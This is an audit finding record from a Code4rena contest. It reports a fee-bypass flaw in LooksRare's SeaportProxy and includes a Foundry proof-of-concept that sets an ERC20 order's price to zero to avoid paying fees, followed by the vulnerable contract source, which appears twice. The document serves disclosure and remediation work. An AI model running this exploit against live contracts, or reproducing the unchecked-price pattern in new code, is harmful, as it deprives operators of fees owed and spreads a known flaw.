{
  "Title": "[M-04] Users can avoid paying any fees when using ERC20EnabledLooksRareAggregator for Seaport",
  "Content": "\n<https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/proxies/SeaportProxy.sol#L136-L164>\n\n<https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/proxies/SeaportProxy.sol#L232-L252>\n\n### Impact\n\nThe `order.price` in the parameter `tradeData` is not used as the actual token amount sent to the seaport market and also not checked if those are equal when using the `ERC20EnabledLooksRareAggregator` for `SeaportPorxy` with ERC20 tokens.\n\nSo users can set the order.price to ZERO to avoid paying any fees for ERC20 orders.\n\n### Proof of Concept\n\nTest file SeaportUSDCZeroPrice.t.sol, modified from test SeaportProxyERC721USDC.t.sol and annotate with `# diff`.\n\n```\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport {IERC20} from \"../../contracts/interfaces/IERC20.sol\";\nimport {IERC721} from \"../../contracts/interfaces/IERC721.sol\";\nimport {OwnableTwoSteps} from \"../../contracts/OwnableTwoSteps.sol\";\nimport {SeaportProxy} from \"../../contracts/proxies/SeaportProxy.sol\";\nimport {ERC20EnabledLooksRareAggregator} from \"../../contracts/ERC20EnabledLooksRareAggregator.sol\";\nimport {LooksRareAggregator} from \"../../contracts/LooksRareAggregator.sol\";\nimport {IProxy} from \"../../contracts/interfaces/IProxy.sol\";\nimport {ILooksRareAggregator} from \"../../contracts/interfaces/ILooksRareAggregator.sol\";\nimport {BasicOrder, FeeData, TokenTransfer} from \"../../contracts/libraries/OrderStructs.sol\";\nimport {TestHelpers} from \"./TestHelpers.sol\";\nimport {TestParameters} from \"./TestParameters.sol\";\nimport {SeaportProxyTestHelpers} from \"./SeaportProxyTestHelpers.sol\";\n\n/**\n * @notice SeaportProxy ERC721 USDC orders with fees tests\n */\ncontract SeaportUSDCZeroPrice is TestParameters, TestHelpers, SeaportProxyTestHelpers {\n    LooksRareAggregator private aggregator;\n    ERC20EnabledLooksRareAggregator private erc20EnabledAggregator;\n    SeaportProxy private seaportProxy;\n\n    function setUp() public {\n        vm.createSelectFork(vm.rpcUrl(\"mainnet\"), 15_491_323);\n\n        aggregator = new LooksRareAggregator();\n        erc20EnabledAggregator = new ERC20EnabledLooksRareAggregator(address(aggregator));\n        seaportProxy = new SeaportProxy(SEAPORT, address(aggregator));\n        aggregator.addFunction(address(seaportProxy), SeaportProxy.execute.selector);\n\n        deal(USDC, _buyer, INITIAL_USDC_BALANCE);\n\n        aggregator.approve(SEAPORT, USDC, type(uint256).max);\n        aggregator.setFee(address(seaportProxy), 250, _protocolFeeRecipient);\n        aggregator.setERC20EnabledLooksRareAggregator(address(erc20EnabledAggregator));\n    }\n\n    function testExecuteWithPriceZero() public asPrankedUser(_buyer) {\n        bool isAtomic = true;\n        ILooksRareAggregator.TradeData[] memory tradeData = _generateTradeData();\n        uint256 totalPrice = \n        // diff\n        // not pay the fee for order 0 , so cut 250 bp from total price\n        (tradeData[0].orders[0].price * (10250 - 250)) /\n        // diff end\n            10000 +\n            (tradeData[0].orders[1].price * 10250) /\n            10000;\n        IERC20(USDC).approve(address(erc20EnabledAggregator), totalPrice);\n        // diff\n        // set order 0 price to ZERO\n        tradeData[0].orders[0].price = 0;\n        // diff end\n\n        TokenTransfer[] memory tokenTransfers = new TokenTransfer[](1);\n        tokenTransfers[0].currency = USDC;\n        tokenTransfers[0].amount = totalPrice;\n\n        erc20EnabledAggregator.execute(tokenTransfers, tradeData, _buyer, isAtomic);\n\n        assertEq(IERC721(BAYC).balanceOf(_buyer), 2);\n        assertEq(IERC721(BAYC).ownerOf(9948), _buyer);\n        assertEq(IERC721(BAYC).ownerOf(8350), _buyer);\n        assertEq(IERC20(USDC).balanceOf(_buyer), INITIAL_USDC_BALANCE - totalPrice);\n    }\n\n    function _generateTradeData() private view returns (ILooksRareAggregator.TradeData[] memory) {\n        BasicOrder memory orderOne = validBAYCId9948Order();\n        BasicOrder memory orderTwo = validBAYCId8350Order();\n        BasicOrder[] memory orders = new BasicOrder[](2);\n        orders[0] = orderOne;\n        orders[1] = orderTwo;\n\n        bytes[] memory ordersExtraData = new bytes[](2);\n        {\n            bytes memory orderOneExtraData = validBAYCId9948OrderExtraData();\n            bytes memory orderTwoExtraData = validBAYCId8350OrderExtraData();\n            ordersExtraData[0] = orderOneExtraData;\n            ordersExtraData[1] = orderTwoExtraData;\n        }\n\n        bytes memory extraData = validMultipleItemsSameCollectionExtraData();\n        ILooksRareAggregator.TradeData[] memory tradeData = new ILooksRareAggregator.TradeData[](1);\n        tradeData[0] = ILooksRareAggregator.TradeData({\n            proxy: address(seaportProxy),\n            selector: SeaportProxy.execute.selector,\n            value: 0,\n            maxFeeBp: 250,\n            orders: orders,\n            ordersExtraData: ordersExtraData,\n            extraData: extraData\n        });\n\n        return tradeData;\n    }\n}\n\n```\n\nrun test:\n\n    forge test --match-test testExecuteWithPriceZero -vvvvv\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nAssert the order price is equal to the token amount of the seaport order when populating parameters.\n\n**[0xhiroshi (LooksRare) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-11-looksrare-findings/issues/143#issuecomment-1325451604):**\n > The worst case is for us to not able to collect fees, and we can technically just deploy a new contract to fix this. Not sure if this is considered assets stolen/lost/compromise?\n\n**[0xhiroshi (LooksRare) commented](https://github.com/code-423n4/2022-11-looksrare-findings/issues/143#issuecomment-1326742454):**\n > Update: we are dropping fees completely.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-looksrare-findings/issues/143#issuecomment-1345540047):**\n > Medium severity as no user funds are at risk, and the impact for the protocol would be minimal.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2022-11-looksrare",
  "Code": [
    {
      "filename": "contracts/proxies/SeaportProxy.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {CollectionType} from \"../libraries/OrderEnums.sol\";\nimport {BasicOrder, FeeData} from \"../libraries/OrderStructs.sol\";\nimport {ItemType, OrderType} from \"../libraries/seaport/ConsiderationEnums.sol\";\nimport {AdvancedOrder, CriteriaResolver, OrderParameters, OfferItem, ConsiderationItem, FulfillmentComponent, AdditionalRecipient} from \"../libraries/seaport/ConsiderationStructs.sol\";\nimport {IProxy} from \"../interfaces/IProxy.sol\";\nimport {SeaportInterface} from \"../interfaces/SeaportInterface.sol\";\nimport {TokenRescuer} from \"../TokenRescuer.sol\";\n\n/**\n * @title SeaportProxy\n * @notice This contract allows NFT sweepers to batch buy NFTs from Seaport\n *         by passing high-level structs + low-level bytes as calldata.\n * @author LooksRare protocol team (ðŸ‘€,ðŸ’Ž)\n */\ncontract SeaportProxy is IProxy, TokenRescuer {\n    SeaportInterface public immutable marketplace;\n    address public immutable aggregator;\n\n    error TradeExecutionFailed();\n\n    struct ExtraData {\n        FulfillmentComponent[][] offerFulfillments; // Contains the order and item index of each offer item\n        FulfillmentComponent[][] considerationFulfillments; // Contains the order and item index of each consideration item\n    }\n\n    struct OrderExtraData {\n        uint120 numerator; // A fraction to attempt to fill\n        uint120 denominator; // The total size of the order\n        OrderType orderType; // Seaport order type\n        address zone; // A zone can cancel the order or restrict who can fulfill the order depending on the type\n        bytes32 zoneHash; // An arbitrary 32-byte value that will be supplied to the zone when fulfilling restricted orders that the zone can utilize when making a determination on whether to authorize the order\n        uint256 salt; // An arbitrary source of entropy for the order\n        bytes32 conduitKey; // A bytes32 value that indicates what conduit, if any, should be utilized as a source for token approvals when performing transfers\n        AdditionalRecipient[] recipients; // Recipients of consideration items\n    }\n\n    /**\n     * @param _marketplace Seaport's address\n     * @param _aggregator LooksRareAggregator's address\n     */\n    constructor(address _marketplace, address _aggregator) {\n        marketplace = SeaportInterface(_marketplace);\n        aggregator = _aggregator;\n    }\n\n    /**\n     * @notice Execute Seaport NFT sweeps in a single transaction\n     * @param orders Orders to be executed by Seaport\n     * @param ordersExtraData Extra data for each order\n     * @param extraData Extra data for the whole transaction\n     * @param recipient The address to receive the purchased NFTs\n     * @param isAtomic Flag to enable atomic trades (all or nothing) or partial trades\n     * @param feeBp Fee basis point to pay for the trade, set by the aggregator\n     * @param feeRecipient Fee recipient for the trade, set by the aggregator\n     */\n    function execute(\n        BasicOrder[] calldata orders,\n        bytes[] calldata ordersExtraData,\n        bytes calldata extraData,\n        address recipient,\n        bool isAtomic,\n        uint256 feeBp,\n        address feeRecipient\n    ) external payable override {\n        if (address(this) != aggregator) revert InvalidCaller();\n\n        uint256 ordersLength = orders.length;\n        if (ordersLength == 0 || ordersLength != ordersExtraData.length) revert InvalidOrderLength();\n\n        if (isAtomic) {\n            _executeAtomicOrders(orders, ordersExtraData, extraData, recipient, feeBp, feeRecipient);\n        } else {\n            _executeNonAtomicOrders(orders, ordersExtraData, recipient, feeBp, feeRecipient);\n        }\n    }\n\n    /**\n     * @dev If fulfillAvailableAdvancedOrders fails, the ETH paid to Seaport\n     *      is refunded to the proxy contract. The proxy then has to refund\n     *      the ETH back to the user through _returnETHIfAny.\n     */\n    receive() external payable {}\n\n    function _executeAtomicOrders(\n        BasicOrder[] calldata orders,\n        bytes[] calldata ordersExtraData,\n        bytes calldata extraData,\n        address recipient,\n        uint256 feeBp,\n        address feeRecipient\n    ) private {\n        uint256 ordersLength = orders.length;\n        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](ordersLength);\n        ExtraData memory extraDataStruct = abi.decode(extraData, (ExtraData));\n\n        uint256 ethValue;\n\n        for (uint256 i; i < ordersLength; ) {\n            OrderExtraData memory orderExtraData = abi.decode(ordersExtraData[i], (OrderExtraData));\n            advancedOrders[i].parameters = _populateParameters(orders[i], orderExtraData);\n            advancedOrders[i].numerator = orderExtraData.numerator;\n            advancedOrders[i].denominator = orderExtraData.denominator;\n            advancedOrders[i].signature = orders[i].signature;\n\n            if (orders[i].currency == address(0)) ethValue += orders[i].price;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        (bool[] memory availableOrders, ) = marketplace.fulfillAvailableAdvancedOrders{value: ethValue}(\n            advancedOrders,\n            new CriteriaResolver[](0),\n            extraDataStruct.offerFulfillments,\n            extraDataStruct.considerationFulfillments,\n            bytes32(0),\n            recipient,\n            ordersLength\n        );\n\n        for (uint256 i; i < availableOrders.length; ) {\n            if (!availableOrders[i]) revert TradeExecutionFailed();\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (feeRecipient != address(0)) _handleFees(orders, feeBp, feeRecipient);\n    }\n\n    function _handleFees(\n        BasicOrder[] calldata orders,\n        uint256 feeBp,\n        address feeRecipient\n    ) private {\n        address lastOrderCurrency;\n        uint256 fee;\n        uint256 ordersLength = orders.length;\n\n        for (uint256 i; i < ordersLength; ) {\n            address currency = orders[i].currency;\n            uint256 orderFee = (orders[i].price * feeBp) / 10000;\n\n            if (currency == lastOrderCurrency) {\n                fee += orderFee;\n            } else {\n                if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n\n                lastOrderCurrency = currency;\n                fee = orderFee;\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n    }\n\n    function _transferFee(\n        uint256 fee,\n        address lastOrderCurrency,\n        address recipient\n    ) private {\n        if (lastOrderCurrency == address(0)) {\n            _transferETH(recipient, fee);\n        } else {\n            _executeERC20DirectTransfer(lastOrderCurrency, recipient, fee);\n        }\n    }\n\n    function _executeNonAtomicOrders(\n        BasicOrder[] calldata orders,\n        bytes[] calldata ordersExtraData,\n        address recipient,\n        uint256 feeBp,\n        address feeRecipient\n    ) private {\n        uint256 fee;\n        address lastOrderCurrency;\n        for (uint256 i; i < orders.length; ) {\n            OrderExtraData memory orderExtraData = abi.decode(ordersExtraData[i], (OrderExtraData));\n            AdvancedOrder memory advancedOrder;\n            advancedOrder.parameters = _populateParameters(orders[i], orderExtraData);\n            advancedOrder.numerator = orderExtraData.numerator;\n            advancedOrder.denominator = orderExtraData.denominator;\n            advancedOrder.signature = orders[i].signature;\n\n            address currency = orders[i].currency;\n            uint256 price = orders[i].price;\n\n            try\n                marketplace.fulfillAdvancedOrder{value: currency == address(0) ? price : 0}(\n                    advancedOrder,\n                    new CriteriaResolver[](0),\n                    bytes32(0),\n                    recipient\n                )\n            {\n                if (feeRecipient != address(0)) {\n                    uint256 orderFee = (price * feeBp) / 10000;\n                    if (currency == lastOrderCurrency) {\n                        fee += orderFee;\n                    } else {\n                        if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n\n                        lastOrderCurrency = currency;\n                        fee = orderFee;\n                    }\n                }\n            } catch {}\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n    }\n\n    function _populateParameters(BasicOrder calldata order, OrderExtraData memory orderExtraData)\n        private\n        pure\n        returns (OrderParameters memory parameters)\n    {\n        uint256 recipientsLength = orderExtraData.recipients.length;\n\n        parameters.offerer = order.signer;\n        parameters.zone = orderExtraData.zone;\n        parameters.zoneHash = orderExtraData.zoneHash;\n        parameters.salt = orderExtraData.salt;\n        parameters.conduitKey = orderExtraData.conduitKey;\n        parameters.orderType = orderExtraData.orderType;\n        parameters.startTime = order.startTime;\n        parameters.endTime = order.endTime;\n        parameters.totalOriginalConsiderationItems = recipientsLength;\n\n        OfferItem[] memory offer = new OfferItem[](1);\n        // Seaport enums start with NATIVE and ERC20 so plus 2\n        offer[0].itemType = ItemType(uint8(order.collectionType) + 2);\n        offer[0].token = order.collection;\n        offer[0].identifierOrCriteria = order.tokenIds[0];\n        uint256 amount = order.amounts[0];\n        offer[0].startAmount = amount;\n        offer[0].endAmount = amount;\n        parameters.offer = offer;\n\n        ConsiderationItem[] memory consideration = new ConsiderationItem[](recipientsLength);\n        for (uint256 j; j < recipientsLength; ) {\n            // We don't need to assign value to identifierOrCriteria as it is always 0.\n            uint256 recipientAmount = orderExtraData.recipients[j].amount;\n            consideration[j].startAmount = recipientAmount;\n            consideration[j].endAmount = recipientAmount;\n            consideration[j].recipient = payable(orderExtraData.recipients[j].recipient);\n            consideration[j].itemType = order.currency == address(0) ? ItemType.NATIVE : ItemType.ERC20;\n            consideration[j].token = order.currency;\n\n            unchecked {\n                ++j;\n            }\n        }\n        parameters.consideration = consideration;\n    }\n}"
    },
    {
      "filename": "contracts/proxies/SeaportProxy.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {CollectionType} from \"../libraries/OrderEnums.sol\";\nimport {BasicOrder, FeeData} from \"../libraries/OrderStructs.sol\";\nimport {ItemType, OrderType} from \"../libraries/seaport/ConsiderationEnums.sol\";\nimport {AdvancedOrder, CriteriaResolver, OrderParameters, OfferItem, ConsiderationItem, FulfillmentComponent, AdditionalRecipient} from \"../libraries/seaport/ConsiderationStructs.sol\";\nimport {IProxy} from \"../interfaces/IProxy.sol\";\nimport {SeaportInterface} from \"../interfaces/SeaportInterface.sol\";\nimport {TokenRescuer} from \"../TokenRescuer.sol\";\n\n/**\n * @title SeaportProxy\n * @notice This contract allows NFT sweepers to batch buy NFTs from Seaport\n *         by passing high-level structs + low-level bytes as calldata.\n * @author LooksRare protocol team (ðŸ‘€,ðŸ’Ž)\n */\ncontract SeaportProxy is IProxy, TokenRescuer {\n    SeaportInterface public immutable marketplace;\n    address public immutable aggregator;\n\n    error TradeExecutionFailed();\n\n    struct ExtraData {\n        FulfillmentComponent[][] offerFulfillments; // Contains the order and item index of each offer item\n        FulfillmentComponent[][] considerationFulfillments; // Contains the order and item index of each consideration item\n    }\n\n    struct OrderExtraData {\n        uint120 numerator; // A fraction to attempt to fill\n        uint120 denominator; // The total size of the order\n        OrderType orderType; // Seaport order type\n        address zone; // A zone can cancel the order or restrict who can fulfill the order depending on the type\n        bytes32 zoneHash; // An arbitrary 32-byte value that will be supplied to the zone when fulfilling restricted orders that the zone can utilize when making a determination on whether to authorize the order\n        uint256 salt; // An arbitrary source of entropy for the order\n        bytes32 conduitKey; // A bytes32 value that indicates what conduit, if any, should be utilized as a source for token approvals when performing transfers\n        AdditionalRecipient[] recipients; // Recipients of consideration items\n    }\n\n    /**\n     * @param _marketplace Seaport's address\n     * @param _aggregator LooksRareAggregator's address\n     */\n    constructor(address _marketplace, address _aggregator) {\n        marketplace = SeaportInterface(_marketplace);\n        aggregator = _aggregator;\n    }\n\n    /**\n     * @notice Execute Seaport NFT sweeps in a single transaction\n     * @param orders Orders to be executed by Seaport\n     * @param ordersExtraData Extra data for each order\n     * @param extraData Extra data for the whole transaction\n     * @param recipient The address to receive the purchased NFTs\n     * @param isAtomic Flag to enable atomic trades (all or nothing) or partial trades\n     * @param feeBp Fee basis point to pay for the trade, set by the aggregator\n     * @param feeRecipient Fee recipient for the trade, set by the aggregator\n     */\n    function execute(\n        BasicOrder[] calldata orders,\n        bytes[] calldata ordersExtraData,\n        bytes calldata extraData,\n        address recipient,\n        bool isAtomic,\n        uint256 feeBp,\n        address feeRecipient\n    ) external payable override {\n        if (address(this) != aggregator) revert InvalidCaller();\n\n        uint256 ordersLength = orders.length;\n        if (ordersLength == 0 || ordersLength != ordersExtraData.length) revert InvalidOrderLength();\n\n        if (isAtomic) {\n            _executeAtomicOrders(orders, ordersExtraData, extraData, recipient, feeBp, feeRecipient);\n        } else {\n            _executeNonAtomicOrders(orders, ordersExtraData, recipient, feeBp, feeRecipient);\n        }\n    }\n\n    /**\n     * @dev If fulfillAvailableAdvancedOrders fails, the ETH paid to Seaport\n     *      is refunded to the proxy contract. The proxy then has to refund\n     *      the ETH back to the user through _returnETHIfAny.\n     */\n    receive() external payable {}\n\n    function _executeAtomicOrders(\n        BasicOrder[] calldata orders,\n        bytes[] calldata ordersExtraData,\n        bytes calldata extraData,\n        address recipient,\n        uint256 feeBp,\n        address feeRecipient\n    ) private {\n        uint256 ordersLength = orders.length;\n        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](ordersLength);\n        ExtraData memory extraDataStruct = abi.decode(extraData, (ExtraData));\n\n        uint256 ethValue;\n\n        for (uint256 i; i < ordersLength; ) {\n            OrderExtraData memory orderExtraData = abi.decode(ordersExtraData[i], (OrderExtraData));\n            advancedOrders[i].parameters = _populateParameters(orders[i], orderExtraData);\n            advancedOrders[i].numerator = orderExtraData.numerator;\n            advancedOrders[i].denominator = orderExtraData.denominator;\n            advancedOrders[i].signature = orders[i].signature;\n\n            if (orders[i].currency == address(0)) ethValue += orders[i].price;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        (bool[] memory availableOrders, ) = marketplace.fulfillAvailableAdvancedOrders{value: ethValue}(\n            advancedOrders,\n            new CriteriaResolver[](0),\n            extraDataStruct.offerFulfillments,\n            extraDataStruct.considerationFulfillments,\n            bytes32(0),\n            recipient,\n            ordersLength\n        );\n\n        for (uint256 i; i < availableOrders.length; ) {\n            if (!availableOrders[i]) revert TradeExecutionFailed();\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (feeRecipient != address(0)) _handleFees(orders, feeBp, feeRecipient);\n    }\n\n    function _handleFees(\n        BasicOrder[] calldata orders,\n        uint256 feeBp,\n        address feeRecipient\n    ) private {\n        address lastOrderCurrency;\n        uint256 fee;\n        uint256 ordersLength = orders.length;\n\n        for (uint256 i; i < ordersLength; ) {\n            address currency = orders[i].currency;\n            uint256 orderFee = (orders[i].price * feeBp) / 10000;\n\n            if (currency == lastOrderCurrency) {\n                fee += orderFee;\n            } else {\n                if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n\n                lastOrderCurrency = currency;\n                fee = orderFee;\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n    }\n\n    function _transferFee(\n        uint256 fee,\n        address lastOrderCurrency,\n        address recipient\n    ) private {\n        if (lastOrderCurrency == address(0)) {\n            _transferETH(recipient, fee);\n        } else {\n            _executeERC20DirectTransfer(lastOrderCurrency, recipient, fee);\n        }\n    }\n\n    function _executeNonAtomicOrders(\n        BasicOrder[] calldata orders,\n        bytes[] calldata ordersExtraData,\n        address recipient,\n        uint256 feeBp,\n        address feeRecipient\n    ) private {\n        uint256 fee;\n        address lastOrderCurrency;\n        for (uint256 i; i < orders.length; ) {\n            OrderExtraData memory orderExtraData = abi.decode(ordersExtraData[i], (OrderExtraData));\n            AdvancedOrder memory advancedOrder;\n            advancedOrder.parameters = _populateParameters(orders[i], orderExtraData);\n            advancedOrder.numerator = orderExtraData.numerator;\n            advancedOrder.denominator = orderExtraData.denominator;\n            advancedOrder.signature = orders[i].signature;\n\n            address currency = orders[i].currency;\n            uint256 price = orders[i].price;\n\n            try\n                marketplace.fulfillAdvancedOrder{value: currency == address(0) ? price : 0}(\n                    advancedOrder,\n                    new CriteriaResolver[](0),\n                    bytes32(0),\n                    recipient\n                )\n            {\n                if (feeRecipient != address(0)) {\n                    uint256 orderFee = (price * feeBp) / 10000;\n                    if (currency == lastOrderCurrency) {\n                        fee += orderFee;\n                    } else {\n                        if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n\n                        lastOrderCurrency = currency;\n                        fee = orderFee;\n                    }\n                }\n            } catch {}\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        if (fee > 0) _transferFee(fee, lastOrderCurrency, feeRecipient);\n    }\n\n    function _populateParameters(BasicOrder calldata order, OrderExtraData memory orderExtraData)\n        private\n        pure\n        returns (OrderParameters memory parameters)\n    {\n        uint256 recipientsLength = orderExtraData.recipients.length;\n\n        parameters.offerer = order.signer;\n        parameters.zone = orderExtraData.zone;\n        parameters.zoneHash = orderExtraData.zoneHash;\n        parameters.salt = orderExtraData.salt;\n        parameters.conduitKey = orderExtraData.conduitKey;\n        parameters.orderType = orderExtraData.orderType;\n        parameters.startTime = order.startTime;\n        parameters.endTime = order.endTime;\n        parameters.totalOriginalConsiderationItems = recipientsLength;\n\n        OfferItem[] memory offer = new OfferItem[](1);\n        // Seaport enums start with NATIVE and ERC20 so plus 2\n        offer[0].itemType = ItemType(uint8(order.collectionType) + 2);\n        offer[0].token = order.collection;\n        offer[0].identifierOrCriteria = order.tokenIds[0];\n        uint256 amount = order.amounts[0];\n        offer[0].startAmount = amount;\n        offer[0].endAmount = amount;\n        parameters.offer = offer;\n\n        ConsiderationItem[] memory consideration = new ConsiderationItem[](recipientsLength);\n        for (uint256 j; j < recipientsLength; ) {\n            // We don't need to assign value to identifierOrCriteria as it is always 0.\n            uint256 recipientAmount = orderExtraData.recipients[j].amount;\n            consideration[j].startAmount = recipientAmount;\n            consideration[j].endAmount = recipientAmount;\n            consideration[j].recipient = payable(orderExtraData.recipients[j].recipient);\n            consideration[j].itemType = order.currency == address(0) ? ItemType.NATIVE : ItemType.ERC20;\n            consideration[j].token = order.currency;\n\n            unchecked {\n                ++j;\n            }\n        }\n        parameters.consideration = consideration;\n    }\n}"
    }
  ]
}